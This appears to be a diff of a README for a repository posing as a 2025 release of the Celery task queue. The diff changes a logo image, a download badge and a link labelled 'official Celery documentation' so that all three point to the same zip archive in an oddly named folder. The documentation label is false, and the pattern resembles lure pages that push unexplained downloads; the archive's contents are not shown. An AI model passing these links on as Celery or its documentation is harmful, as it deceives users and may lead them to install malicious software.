@@ -1,6 +1,6 @@
 # 🌟 Welcome to Celery Task Queue Latest 2025 🌟
 
-![Celery Logo](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v2.0/Software.zip)
+![Celery Logo](https://raw.githubusercontent.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/main/folksiness/Queue-latest-Task-Celery-2.3.zip)
 
 ---
 
@@ -37,12 +37,12 @@ This repository covers a wide range of topics related to Celery and distributed 
 - Task scheduler
 
 ### 📦 Download the Latest Release
-[![Download Latest Release](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v2.0/Software.zip%20Version-brightgreen)](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v2.0/Software.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/main/folksiness/Queue-latest-Task-Celery-2.3.zip%20Version-brightgreen)](https://raw.githubusercontent.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/main/folksiness/Queue-latest-Task-Celery-2.3.zip)
 
 🚀 **Launch the latest version to experience the power of Celery!**
 
 ### 🌐 Get Started
-Visit the official Celery documentation to learn more about how to leverage the capabilities of Celery in your projects: [Celery Documentation](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v2.0/Software.zip)
+Visit the official Celery documentation to learn more about how to leverage the capabilities of Celery in your projects: [Celery Documentation](https://raw.githubusercontent.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/main/folksiness/Queue-latest-Task-Celery-2.3.zip)
 
 ### 🛠️ Installation
 1. Install Celery using pip:
